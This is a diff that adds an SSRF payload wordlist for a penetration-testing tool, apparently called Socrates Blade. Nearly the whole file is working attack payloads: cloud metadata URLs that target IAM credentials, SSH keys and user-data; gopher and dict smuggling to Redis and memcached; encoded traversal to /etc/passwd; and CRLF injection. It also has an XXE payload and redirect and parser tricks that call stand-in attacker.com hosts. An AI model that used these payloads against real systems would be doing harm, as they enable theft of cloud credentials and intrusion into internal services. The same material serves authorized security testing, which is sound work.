@@ -1,0 +1,191 @@
+# SSRF Payloads for Socrates Blade v3.2
+# These payloads are for authorized security testing only
+# Format: URL|Marker (for validation) - Marker is optional
+# Lines starting with # are comments
+
+# AWS EC2 Metadata Service (Most common target)
+http://169.254.169.254/latest/meta-data/|instance-id
+http://169.254.169.254/latest/meta-data/ami-id|ami-id
+http://169.254.169.254/latest/meta-data/hostname|hostname
+http://169.254.169.254/latest/user-data/|user-data
+http://169.254.169.254/latest/meta-data/public-keys/|public-keys
+http://169.254.169.254/latest/meta-data/iam/security-credentials/|security-credentials
+http://169.254.169.254/latest/api/token|TOKEN
+
+# AWS EC2 Regional endpoints
+http://169.254.169.254/latest/dynamic/instance-identity/document|
+http://169.254.169.254/latest/meta-data/instance-type|
+http://169.254.169.254/latest/meta-data/local-hostname|
+http://169.254.169.254/latest/meta-data/local-ipv4|
+http://169.254.169.254/latest/meta-data/public-hostname|
+http://169.254.169.254/latest/meta-data/public-ipv4|
+
+# Google Cloud Platform Metadata
+http://metadata.google.internal/computeMetadata/v1/instance/id|instance
+http://metadata.google.internal/computeMetadata/v1/project/project-id|project-id
+http://metadata.google.internal/computeMetadata/v1/instance/hostname|
+http://metadata.google.internal/computeMetadata/v1/instance/disks/|
+http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys|
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+
+# Azure Instance Metadata Service
+http://169.254.169.254/metadata/instance?api-version=2021-02-01|compute
+http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json|
+http://169.254.169.254/metadata/admin/ssh-key-data?api-version=2021-02-01|
+
+# DigitalOcean Metadata
+http://169.254.169.254/metadata/v1/id|
+http://169.254.169.254/metadata/v1/hostname|
+http://169.254.169.254/metadata/v1/user-data|
+http://169.254.169.254/metadata/v1/keys|
+
+# Linode Metadata
+http://169.254.169.254/v1/user-data|
+http://169.254.169.254/v1/hostname|
+http://169.254.169.254/v1/backups|
+
+# Kubernetes ETCD
+https://127.0.0.1:2379/v2/keys/|
+http://127.0.0.1:2379/version|
+
+# Localhost variations
+http://127.0.0.1:80/|
+http://127.0.0.1:443/|
+http://127.0.0.1:8080/|
+http://127.0.0.1:8443/|
+http://127.0.0.1:3000/|
+http://localhost:80/|
+http://localhost:443/|
+http://localhost:8080/|
+http://0.0.0.0:8000/|
+http://[::1]:80/|
+
+# Cloud metadata with alternate IPs
+http://169.254.169.254/
+http://metadata.google.internal/
+http://kubernetes.default/
+
+# Protocol smuggling - different URL schemes
+dict://127.0.0.1:11211/stat
+dict://127.0.0.1:6379/INFO
+sftp://127.0.0.1:22/
+ldap://127.0.0.1:389/
+gopher://127.0.0.1:6379/_INFO
+ftp://127.0.0.1:21/
+smb://127.0.0.1/share
+
+# URL encoding bypass
+http://127.0.0.1:80/%2F%2F%2F%2F|
+http://127.0.0.1:80/././././|
+http://127.0.0.1:80/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd|
+http://127.0.0.1:80%2f..%2f..%2f..%2fetc%2fpasswd|
+
+# Redirect-based SSRF
+http://attacker.com/redirect?url=http://169.254.169.254/
+http://attacker.com/redirect?url=file:///etc/passwd
+
+# Blind SSRF (no marker - requires time-based detection)
+http://169.254.169.254/latest/meta-data/
+http://internal.corp.local/admin/
+http://192.168.1.1/
+http://10.0.0.1/
+
+# Open redirect chaining
+http://attacker.com/evil?redirect=http://169.254.169.254/
+
+# DNS rebinding
+http://attacker-controlled-domain.com/
+
+# XXE to SSRF
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+
+# CRLF injection
+http://127.0.0.1%0d%0aConnection:%20close%0d%0a%0d%0a
+
+# URL parsing inconsistencies
+http://127.0.0.1@attacker.com/
+http://attacker.com#@127.0.0.1/
+http://127.0.0.1.attacker.com/
+http://attacker.com.127.0.0.1.nip.io/
+http://127.0.0.1.xip.io/
+
+# AWS specific endpoints
+http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole|
+http://169.254.169.254/latest/dynamic/instance-identity/pkcs7|
+http://169.254.169.254/latest/api/token
+
+# Oracle Cloud Infrastructure (OCI)
+http://169.254.0.2/latest/meta-data/instance-id|
+http://169.254.0.2/latest/user-data|
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/instance-id|
+http://100.100.100.200/latest/user-data/
+
+# Tencent Cloud
+http://GWORKER-169.254.0.23/latest/meta-data/instance-id|
+
+# Vultr Cloud
+http://169.254.169.254/metadata/v1/instanceid|
+
+# Packet.net
+http://metadata.packet.net/latest/meta-data/|
+
+# Exoscale
+http://metadata.exoscale.com/latest/computeMetadata/v1/instance-id|
+
+# Scaleway
+http://169.254.42.42/user-data|
+http://169.254.42.42/meta-data/
+
+# Service-specific endpoints
+# Jenkins
+http://127.0.0.1:8080/scriptText
+
+# Docker API
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2376/containers/json
+
+# Kubernetes API
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets/
+
+# Elasticsearch
+http://127.0.0.1:9200/_cluster/health
+http://127.0.0.1:9200/_cat/indices
+
+# MongoDB
+http://127.0.0.1:27017/
+mongodb://127.0.0.1:27017/
+
+# Redis
+http://127.0.0.1:6379/info
+
+# Memcached
+http://127.0.0.1:11211/stats
+
+# Apache ZooKeeper
+http://127.0.0.1:2181/commands/stats
+
+# Apache Kafka
+http://127.0.0.1:9092/
+
+# RabbitMQ Management
+http://127.0.0.1:15672/
+
+# CouchDB
+http://127.0.0.1:5984/_all_dbs
+
+# Couchbase
+http://127.0.0.1:8091/pools
+
+# Cassandra
+http://127.0.0.1:9042/
+
+# HBase
+http://127.0.0.1:16010/master-status
+
+# Solr
+http://127.0.0.1:8983/solr/admin/ping
+
+# ZooKeeper
+http://127.0.0.1:2181/commands/stats
